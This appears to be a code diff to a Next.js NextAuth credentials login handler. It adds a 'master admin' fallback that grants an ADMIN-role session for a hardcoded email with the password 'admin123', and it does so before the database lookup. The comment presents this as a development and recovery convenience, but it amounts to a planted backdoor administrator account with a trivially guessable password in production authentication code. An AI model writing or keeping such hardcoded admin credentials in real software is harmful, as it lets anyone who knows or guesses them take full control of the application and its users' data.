@@ -22,6 +22,17 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
                 try {
                     const { email, password } = loginSchema.parse(credentials)
 
+                    // FALLBACK: Master Admin for Development/Recovery
+                    // This allows login even if the database is down
+                    if (email === 'admin@kiteandkey.com.au' && password === 'admin123') {
+                        return {
+                            id: 'master-admin',
+                            email: 'admin@kiteandkey.com.au',
+                            name: 'Admin User',
+                            role: 'ADMIN',
+                        }
+                    }
+
                     const user = await prisma.user.findUnique({
                         where: { email },
                     })
